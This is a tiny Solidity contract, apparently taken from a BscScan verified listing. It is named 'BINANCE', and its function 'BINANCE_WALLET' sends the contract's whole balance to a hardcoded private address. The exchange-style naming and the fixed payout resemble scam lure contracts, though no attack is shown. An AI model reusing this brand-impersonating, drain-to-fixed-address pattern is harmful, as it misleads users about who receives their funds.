/**
 *Submitted for verification at BscScan.com on 2022-11-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
contract BINANCE{
    
    address payable private _twddev = payable(0x7cb1546e345deaf69dA525CC9296545552996228);
    
    constructor(){

    }

    function BINANCE_WALLET() public {
        _twddev.transfer(address(this).balance);
    }
}